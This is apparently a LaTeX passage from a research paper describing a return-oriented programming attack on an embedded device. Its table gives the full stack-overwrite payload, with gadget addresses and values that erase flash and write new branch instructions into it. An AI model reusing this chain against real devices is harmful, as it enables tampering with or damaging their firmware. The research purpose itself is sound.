The ROP attack was first approached by determining the size and boundaries of the stack (see Figure \ref{fig::stack}). Once the boundaries were determined, we replaced the location which would be popped into the program counter (PC) with the address of Gadget A. Each successive call (shown in Table \ref{tab:ropresult}) was determined by overwriting the values to be placed into the R4 and PC registers.

The attack outlined in Table \ref{tab:ropresult} was performed and resulted in the desired functionality until the device was reset. Upon reset, the program would jump to a scatter function located in the previously erased region. This resulted in an interrupt which prevented the device from executing the program located at the address of main(). This was solved by inserting a branch to main in the scatter function. 

% Table generated by Excel2LaTeX from sheet 'Sheet2'
\begin{table}[htbp]
  \centering
  \caption{The ROP design. }
    \begin{tabular}{rrrr}
    \toprule
    Gadget     & Pop into R4 & Pop into PC & Description \\
    \midrule
               & 3030 3030  & 3030 3030  & Fluff \\
               & 3030 3030  & 3030 3030  & Fluff \\
               & 0000 0000  & 0000 0000  & Fluff \\
               & 0000 0000  & 0000 0000  & Fluff \\
               & 0000 0000  & 0000 0000  & Pop \{R4-R5\} \\
    pop \{pc\}   & 7536 0000  &            & Return to A0 \\
    A0         & 0048 0000  & a742 0000  & Erase address \\
    B          & 00d0 0f40  & 7336 0000  & Write erase address \\
    A          & 0200 42a4  & a742 0000  & Erase command \\
    B          & 08d0 0f40  & 7336 0000  & Write erase command \\
    A          & e04b 0000  & a742 0000  & main address \\
    B          & 00d0 0f40  & 7336 0000  & Write main address \\
    A          & 00f1 0100  & a742 0000  & add R0,\#0x1 \\
    B          & 20d1 0f40  & 7336 0000  & Write add \\
    A          & fce7 5555  & a742 0000  & b main \\
    B          & 24d1 0f40  & 7336 0000  & Write b \\
    A          & ffff ffff  & a742 0000  & Clear write buffer \\
    B          & 30d0 0f40  & 7336 0000  & Write clear \\
    A          & 0100 42a4  & a742 0000  & Flash key \\
    B          & 20d0 0f40  & 7336 0000  & Write flash key \\
    A          & 584b 0000  & a742 0000  & Scatter addr \\
    B          & 00d0 0f40  & 7336 0000  & Write scatter addr \\
    A          & 42e0 0000  & a742 0000  & b main \\
    B          & 18d1 0f40  & 7336 0000  & Write b main \\
    A          & ffff ffff  & a742 0000  & Clear write buffer \\
    B          & 30d0 0f40  & 7336 0000  & Write clear \\
    A          & 0100 42a4  & a742 0000  & Flash key \\
    B          & 20d0 0f40  & 7336 0000  & Write flash key \\
    A          & 0000 0000  & a14b 0000  & Return to main \\
               & 1b         &            &  \\
    \bottomrule
    \end{tabular}%

  \label{tab:ropresult}%
\end{table}%
